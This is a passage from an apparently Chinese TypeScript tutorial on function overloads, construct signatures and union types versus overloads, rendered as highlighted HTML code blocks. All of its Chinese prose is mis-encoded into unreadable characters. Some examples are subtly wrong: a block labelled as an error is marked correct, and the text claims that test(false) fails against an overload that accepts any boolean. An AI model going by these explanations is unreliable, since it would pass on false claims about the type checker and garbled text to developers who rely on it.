<span class="hljs-title function_">padLeft</span>(<span class="hljs-params"><span class="hljs-attr">value</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">padding</span>: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">string</span>;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">padLeft</span>(<span class="hljs-params"><span class="hljs-attr">value</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">padding</span>: <span class="hljs-built_in">any</span></span>): <span class="hljs-built_in">string</span> &#123;<br>  <span class="hljs-comment">/*...*/</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å‡½æ•°ç±»å‹é«˜çº§æŠ€å·§</strong></p><p>å‡½æ•°å±æ€§æ‰©å±•ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">SearchFunction</span> &#123;<br>  (<span class="hljs-attr">source</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">subString</span>: <span class="hljs-built_in">string</span>): <span class="hljs-built_in">boolean</span>;<br>  <span class="hljs-comment">// é™„åŠ å±æ€§</span><br>  <span class="hljs-attr">description</span>: <span class="hljs-built_in">string</span>;<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-attr">mySearch</span>: <span class="hljs-title class_">SearchFunction</span> = <span class="hljs-function">(<span class="hljs-params">src, sub</span>) =&gt;</span> src.<span class="hljs-title function_">includes</span>(sub);<br>mySearch.<span class="hljs-property">description</span> = <span class="hljs-string">&quot;String search function&quot;</span>;<br></code></pre></td></tr></table></figure><p>æ„é€ ç­¾åå‡½æ•°ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">ClockConstructor</span> &#123;<br>  <span class="hljs-title function_">new</span> (<span class="hljs-attr">hour</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">minute</span>: <span class="hljs-built_in">number</span>): <span class="hljs-title class_">ClockInterface</span>;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">createClock</span>(<span class="hljs-params"><span class="hljs-attr">ctor</span>: <span class="hljs-title class_">ClockConstructor</span>, <span class="hljs-attr">h</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">m</span>: <span class="hljs-built_in">number</span></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title function_">ctor</span>(h, m);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1-3-2-å‡½æ•°é‡è½½çš„å·¥ç¨‹å®è·µ"><a href="#1-3-2-å‡½æ•°é‡è½½çš„å·¥ç¨‹å®è·µ" class="headerlink" title="1.3.2 å‡½æ•°é‡è½½çš„å·¥ç¨‹å®è·µ"></a>1.3.2 å‡½æ•°é‡è½½çš„å·¥ç¨‹å®è·µ</h3><p><strong>å‡½æ•°é‡è½½åŸºç¡€æ¦‚å¿µ</strong></p><p>æ ¸å¿ƒç›®çš„ï¼šä¸ºåŒä¸€å‡½æ•°æä¾›å¤šä¸ªç±»å‹ç­¾åï¼Œå¤„ç†ä¸åŒå‚æ•°ç»„åˆæˆ–è¿”å›ç±»å‹</p><p>åŸºæœ¬ç»“æ„ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// é‡è½½ç­¾åï¼ˆç±»å‹å£°æ˜ï¼‰</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">parseInput</span>(<span class="hljs-params"><span class="hljs-attr">input</span>: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">number</span>;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">parseInput</span>(<span class="hljs-params"><span class="hljs-attr">input</span>: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">string</span>;<br><br><span class="hljs-comment">// å®ç°ç­¾åï¼ˆå®é™…å‡½æ•°ä½“ï¼‰</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">parseInput</span>(<span class="hljs-params"><span class="hljs-attr">input</span>: <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">number</span> | <span class="hljs-built_in">string</span> &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> input === <span class="hljs-string">&quot;string&quot;</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">parseInt</span>(input, <span class="hljs-number">10</span>); <span class="hljs-comment">// è¿”å› number</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> input.<span class="hljs-title function_">toString</span>(); <span class="hljs-comment">// è¿”å› string</span><br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">const</span> num = <span class="hljs-title function_">parseInput</span>(<span class="hljs-string">&quot;123&quot;</span>); <span class="hljs-comment">// number</span><br><span class="hljs-keyword">const</span> str = <span class="hljs-title function_">parseInput</span>(<span class="hljs-number">123</span>);   <span class="hljs-comment">// string</span><br></code></pre></td></tr></table></figure><p><strong>é‡è½½è§„åˆ™ä¸ç‰¹æ€§</strong></p><ol><li>ä¼˜å…ˆçº§è§„åˆ™ï¼š<ul><li>ä»ä¸Šåˆ°ä¸‹åŒ¹é…ç¬¬ä¸€ä¸ªç¬¦åˆçš„é‡è½½ç­¾å</li><li>å®ç°ç­¾åä¸å¯ç›´æ¥è°ƒç”¨ï¼ˆå¯¹å¤–ä¸å¯è§ï¼‰</li></ul></li><li>å‚æ•°ç±»å‹å…¼å®¹ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æ­£ç¡®ï¼šå®ç°ç­¾åå¿…é¡»å…¼å®¹æ‰€æœ‰é‡è½½</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fn</span>(<span class="hljs-params"><span class="hljs-attr">a</span>: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">void</span>;    <span class="hljs-comment">// âœ…</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fn</span>(<span class="hljs-params"><span class="hljs-attr">a</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">b</span>: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">void</span>; <span class="hljs-comment">// âœ…</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fn</span>(<span class="hljs-params"><span class="hljs-attr">a</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">b</span>?: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">void</span> &#123;&#125; <span class="hljs-comment">// âœ…</span><br><br><span class="hljs-comment">// é”™è¯¯ï¼šå®ç°ç­¾åä¸å…¼å®¹é‡è½½</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fn</span>(<span class="hljs-params"><span class="hljs-attr">a</span>: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">void</span>;    <span class="hljs-comment">// ğŸš«</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fn</span>(<span class="hljs-params"><span class="hljs-attr">a</span>: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">void</span> &#123;&#125;  <span class="hljs-comment">// é”™è¯¯ï¼šç¼ºå°‘numberå‚æ•°å¤„ç†</span><br></code></pre></td></tr></table></figure><ol start="3"><li>è¿”å›å€¼ç±»å‹çº¦æŸï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// è¿”å›å€¼å¿…é¡»è¦†ç›–æ‰€æœ‰é‡è½½</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getValue</span>(<span class="hljs-params"></span>): <span class="hljs-built_in">string</span>;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getValue</span>(<span class="hljs-params"><span class="hljs-attr">format</span>: <span class="hljs-built_in">boolean</span></span>): <span class="hljs-built_in">number</span>;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getValue</span>(<span class="hljs-params"><span class="hljs-attr">format</span>?: <span class="hljs-built_in">boolean</span></span>): <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span> &#123;<br>  <span class="hljs-keyword">return</span> format ? <span class="hljs-number">123</span> : <span class="hljs-string">&quot;abc&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å·¥ç¨‹å®è·µæ¨¡å¼</strong></p><p>æ¨¡å¼1ï¼šå‚æ•°ç±»å‹è½¬æ¢</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// å­—ç¬¦ä¸²å’Œæ—¥æœŸäº’è½¬</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">convert</span>(<span class="hljs-params"><span class="hljs-attr">value</span>: <span class="hljs-built_in">string</span></span>): <span class="hljs-title class_">Date</span>;       <span class="hljs-comment">// string â†’ Date</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">convert</span>(<span class="hljs-params"><span class="hljs-attr">value</span>: <span class="hljs-title class_">Date</span></span>): <span class="hljs-built_in">string</span>;       <span class="hljs-comment">// Date â†’ string</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">convert</span>(<span class="hljs-params"><span class="hljs-attr">value</span>: <span class="hljs-built_in">string</span> | <span class="hljs-title class_">Date</span></span>): <span class="hljs-title class_">Date</span> | <span class="hljs-built_in">string</span> &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> value === <span class="hljs-string">&quot;string&quot;</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(value);<br>  &#125;<br>  <span class="hljs-keyword">return</span> value.<span class="hljs-title function_">toISOString</span>();<br>&#125;<br><br><span class="hljs-keyword">const</span> date = <span class="hljs-title function_">convert</span>(<span class="hljs-string">&quot;2023-01-01&quot;</span>);  <span class="hljs-comment">// Date</span><br><span class="hljs-keyword">const</span> str = <span class="hljs-title function_">convert</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());     <span class="hljs-comment">// string</span><br></code></pre></td></tr></table></figure><p>æ¨¡å¼2ï¼šé…ç½®å¯¹è±¡é‡è½½</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ç®€å•æ¨¡å¼</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">SimpleConfig</span> &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;<br>&#125;<br><br><span class="hljs-comment">// é«˜çº§æ¨¡å¼</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">AdvancedConfig</span> &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;<br>  <span class="hljs-attr">debug</span>: <span class="hljs-built_in">boolean</span>;<br>  <span class="hljs-attr">retries</span>: <span class="hljs-built_in">number</span>;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"><span class="hljs-attr">config</span>: <span class="hljs-title class_">SimpleConfig</span></span>): <span class="hljs-built_in">void</span>;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"><span class="hljs-attr">config</span>: <span class="hljs-title class_">AdvancedConfig</span></span>): <span class="hljs-built_in">void</span>;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"><span class="hljs-attr">config</span>: <span class="hljs-title class_">SimpleConfig</span> | <span class="hljs-title class_">AdvancedConfig</span></span>): <span class="hljs-built_in">void</span> &#123;<br>  <span class="hljs-comment">// å…¬å…±åˆå§‹åŒ–é€»è¾‘</span><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Initializing <span class="hljs-subst">$&#123;config.name&#125;</span>`</span>);<br>  <br>  <span class="hljs-comment">// ç±»å‹å®ˆå«å¤„ç†é«˜çº§é…ç½®</span><br>  <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;debug&quot;</span> <span class="hljs-keyword">in</span> config) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Debug mode:&quot;</span>, config.<span class="hljs-property">debug</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¨¡å¼3ï¼šDOM æ“ä½œé‡è½½</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">getElement</span>(<span class="hljs-params"><span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span></span>): <span class="hljs-title class_">HTMLElement</span> | <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">function</span> getElement&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HTMLElement</span>&gt;(<span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">type</span>: <span class="hljs-title function_">new</span>() =&gt; T): T | <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getElement</span>(<span class="hljs-params"><span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">type</span>?: <span class="hljs-keyword">new</span>() =&gt; <span class="hljs-title class_">HTMLElement</span></span>): <span class="hljs-title class_">HTMLElement</span> | <span class="hljs-literal">null</span> &#123;<br>  <span class="hljs-keyword">const</span> el = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(id);<br>  <span class="hljs-keyword">if</span> (el &amp;&amp; <span class="hljs-keyword">type</span> &amp;&amp; !(el <span class="hljs-keyword">instanceof</span> <span class="hljs-keyword">type</span>)) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`Element type mismatch`</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> el;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">const</span> div = <span class="hljs-title function_">getElement</span>(<span class="hljs-string">&quot;header&quot;</span>, <span class="hljs-title class_">HTMLDivElement</span>); <span class="hljs-comment">// HTMLDivElement | null</span><br><span class="hljs-keyword">const</span> generic = <span class="hljs-title function_">getElement</span>(<span class="hljs-string">&quot;content&quot;</span>);            <span class="hljs-comment">// HTMLElement | null</span><br></code></pre></td></tr></table></figure><p><strong>è”åˆç±»å‹ vs å‡½æ•°é‡è½½</strong></p><table><thead><tr><th align="left">åœºæ™¯</th><th align="left">æ¨èæ–¹æ¡ˆ</th><th align="left">åŸå› </th></tr></thead><tbody><tr><td align="left">å‚æ•°ç±»å‹å†³å®šè¿”å›å€¼ç±»å‹</td><td align="left">å‡½æ•°é‡è½½</td><td align="left">æä¾›ç²¾ç¡®çš„è¿”å›ç±»å‹</td></tr><tr><td align="left">å‚æ•°æ•°é‡å˜åŒ–</td><td align="left">å‡½æ•°é‡è½½</td><td align="left">æ˜ç¡®ä¸åŒå‚æ•°ç»„åˆ</td></tr><tr><td align="left">å‚æ•°ç±»å‹ç›¸åŒä½†å¤„ç†é€»è¾‘ä¸åŒ</td><td align="left">è”åˆç±»å‹ + ç±»å‹å®ˆå«</td><td align="left">é¿å…é‡è½½ç­¾åè†¨èƒ€</td></tr><tr><td align="left">å¤æ‚é…ç½®å¯¹è±¡</td><td align="left">å‡½æ•°é‡è½½</td><td align="left">åŒºåˆ†ä¸åŒé…ç½®ç»“æ„</td></tr><tr><td align="left">ç®€å•ç±»å‹å˜æ¢</td><td align="left">è”åˆç±»å‹</td><td align="left">å‡å°‘æ ·æ¿ä»£ç </td></tr></tbody></table><p>è”åˆç±»å‹ç¤ºä¾‹ï¼ˆé€‚åˆç®€å•åœºæ™¯ï¼‰ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ä½¿ç”¨è”åˆç±»å‹æ›¿ä»£é‡è½½</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">padLeft</span>(<span class="hljs-params"><span class="hljs-attr">value</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">padding</span>: <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">string</span> &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> padding === <span class="hljs-string">&quot;number&quot;</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot; &quot;</span>.<span class="hljs-title function_">repeat</span>(padding) + value;<br>  &#125;<br>  <span class="hljs-keyword">return</span> padding + value;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æœ€ä½³å®è·µæŒ‡å—</strong></p><ol><li>æ§åˆ¶é‡è½½æ•°é‡ï¼š<ul><li>å»ºè®®ä¸è¶…è¿‡ 5 ä¸ªé‡è½½ç­¾å</li><li>è¿‡å¤šé‡è½½ä¼šå¯¼è‡´ç±»å‹ç³»ç»Ÿè´Ÿæ‹…å¢åŠ </li></ul></li><li>å…¬å…±å‰ç½®å¤„ç†ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">processData</span>(<span class="hljs-params"><span class="hljs-attr">data</span>: <span class="hljs-built_in">string</span></span>): <span class="hljs-title class_">ResultA</span>;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">processData</span>(<span class="hljs-params"><span class="hljs-attr">data</span>: <span class="hljs-title class_">Buffer</span></span>): <span class="hljs-title class_">ResultB</span>;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">processData</span>(<span class="hljs-params"><span class="hljs-attr">data</span>: <span class="hljs-built_in">string</span> | <span class="hljs-title class_">Buffer</span></span>): <span class="hljs-title class_">ResultA</span> | <span class="hljs-title class_">ResultB</span> &#123;<br>  <span class="hljs-comment">// å…¬å…±éªŒè¯é€»è¾‘</span><br>  <span class="hljs-keyword">if</span> (data.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;Empty data&quot;</span>);<br>  <br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> data === <span class="hljs-string">&quot;string&quot;</span>) &#123;<br>    <span class="hljs-comment">/* ç‰¹å®šå¤„ç† */</span><br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">/* ç‰¹å®šå¤„ç† */</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>ä½¿ç”¨ç±»å‹å‚æ•°å‡å°‘é‡è½½ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ä½¿ç”¨æ³›å‹æ›¿ä»£å¤šä¸ªé‡è½½</span><br><span class="hljs-keyword">function</span> identity&lt;T&gt;(<span class="hljs-attr">arg</span>: T): T &#123;<br>  <span class="hljs-keyword">return</span> arg;<br>&#125;<br><br><span class="hljs-comment">// æ¯”ä»¥ä¸‹é‡è½½æ›´ç®€æ´ï¼š</span><br><span class="hljs-comment">// function identity(arg: string): string;</span><br><span class="hljs-comment">// function identity(arg: number): number;</span><br><span class="hljs-comment">// ...</span><br></code></pre></td></tr></table></figure><ol start="4"><li>æ–‡æ¡£æ³¨é‡Šè§„èŒƒï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * åˆ›å»ºç”¨æˆ·</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> <span class="hljs-variable">name</span> - ç”¨æˆ·å</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@returns</span> ç”¨æˆ·ID</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">createUser</span>(<span class="hljs-params"><span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">string</span>;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * åˆ›å»ºç”¨æˆ·ï¼ˆå¸¦é…ç½®ï¼‰</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> <span class="hljs-variable">options</span> - ç”¨æˆ·é…ç½®</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@returns</span> ç”¨æˆ·ID</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">createUser</span>(<span class="hljs-params"><span class="hljs-attr">options</span>: <span class="hljs-title class_">UserOptions</span></span>): <span class="hljs-built_in">string</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">createUser</span>(<span class="hljs-params"><span class="hljs-attr">param</span>: <span class="hljs-built_in">string</span> | <span class="hljs-title class_">UserOptions</span></span>): <span class="hljs-built_in">string</span> &#123;<br>  <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å¸¸è§é”™è¯¯ä¸è§£å†³æ–¹æ¡ˆ</strong></p><p>é”™è¯¯1ï¼šå¿½ç•¥å®ç°ç­¾åå…¼å®¹æ€§</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// é”™è¯¯å®ç°</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"><span class="hljs-attr">a</span>: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">void</span>;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"><span class="hljs-attr">a</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">b</span>: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">void</span>;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"><span class="hljs-attr">a</span>: <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span>, <span class="hljs-attr">b</span>?: <span class="hljs-built_in">string</span></span>) &#123;&#125; <span class="hljs-comment">// âœ… æ­£ç¡®</span><br><br><span class="hljs-comment">// æ­£ç¡®ï¼šæ·»åŠ å¿…è¦çš„å‚æ•°æ£€æŸ¥</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"><span class="hljs-attr">a</span>: <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span>, <span class="hljs-attr">b</span>?: <span class="hljs-built_in">string</span></span>) &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> a === <span class="hljs-string">&quot;number&quot;</span> &amp;&amp; b === <span class="hljs-literal">undefined</span>) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;Missing second argument&quot;</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é”™è¯¯2ï¼šè¿”å›å€¼ç±»å‹ä¸å®Œæ•´</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// é”™è¯¯ï¼šç¼ºå°‘booleanè¿”å›ç±»å‹</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">test</span>(<span class="hljs-params"></span>): <span class="hljs-built_in">string</span>;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">test</span>(<span class="hljs-params"><span class="hljs-attr">flag</span>: <span class="hljs-built_in">boolean</span></span>): <span class="hljs-built_in">number</span>;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">test</span>(<span class="hljs-params"><span class="hljs-attr">flag</span>?: <span class="hljs-built_in">boolean</span></span>): <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span> &#123; <br>  <span class="hljs-keyword">return</span> flag ? <span class="hljs-number">123</span> : <span class="hljs-string">&quot;abc&quot;</span>; <br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">const</span> result = <span class="hljs-title function_">test</span>(<span class="hljs-literal">true</span>);  <span class="hljs-comment">// number âœ…</span><br><span class="hljs-keyword">const</span> result2 = <span class="hljs-title function_">test</span>();     <span class="hljs-comment">// string âœ…</span><br><span class="hljs-keyword">const</span> result3 = <span class="hljs-title function_">test</span>(<span class="hljs-literal">false</span>); <span class="hljs-comment">// ğŸš« é”™è¯¯ï¼æœªå£°æ˜è¿”å›boolean</span><br></code></pre></td></tr></table></figure><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ä¿®æ­£ï¼šæ·»åŠ å®Œæ•´é‡è½½</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">test</span>(<span class="hljs-params"></span>): <span class="hljs-built_in">string</span>;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">test</span>(<span class="hljs-params"><span class="hljs-attr">flag</span>: <span class="hljs-literal">true</span></span>): <span class="hljs-built_in">number</span>;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">test</span>(<span class="hljs-params"><span class="hljs-attr">flag</span>: <span class="hljs-literal">false</span></span>): <span class="hljs-built_in">string</span>;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">test</span>(<span class="hljs-params"><span class="hljs-attr">flag</span>?: <span class="hljs-built_in">boolean</span></span>): <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span> &#123;<br>  <span class="hljs-keyword">return</span> flag ? <span class="hljs-number">123</span> : <span 